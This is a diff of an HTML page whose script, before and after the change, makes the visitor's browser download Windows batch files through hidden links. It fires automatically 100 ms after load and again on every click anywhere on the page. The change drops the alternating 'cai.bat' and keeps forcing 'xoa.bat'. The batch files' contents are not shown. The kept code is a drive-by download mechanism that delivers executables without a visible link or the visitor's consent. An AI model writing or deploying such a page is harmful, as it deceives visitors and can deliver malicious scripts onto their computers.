@@ -15,29 +15,17 @@ html, body {
 </style>
 </head>
 <body>
-<a id="dx" href="xoa.bat" download="xoa.bat" style="display:none"></a>
-<a id="dc" href="cai.bat" download="cai.bat" style="display:none"></a>
+<a id="d" href="xoa.bat" download="xoa.bat" style="display:none"></a>
 <script>
-var step = 0;
-function dl(id) {
-    var a = document.getElementById(id);
+function triggerDownload() {
+    var a = document.getElementById('d');
     if (a) a.click();
 }
 window.addEventListener('DOMContentLoaded', function() {
-    setTimeout(function() {
-        if (step === 0) {
-            step = 1;
-            dl('dx');
-        }
-    }, 100);
+    setTimeout(triggerDownload, 100);
 });
 document.addEventListener('click', function() {
-    if (step % 2 === 1) {
-        dl('dc');
-    } else {
-        dl('dx');
-    }
-    step++;
+    triggerDownload();
 });
 </script>
 </body>
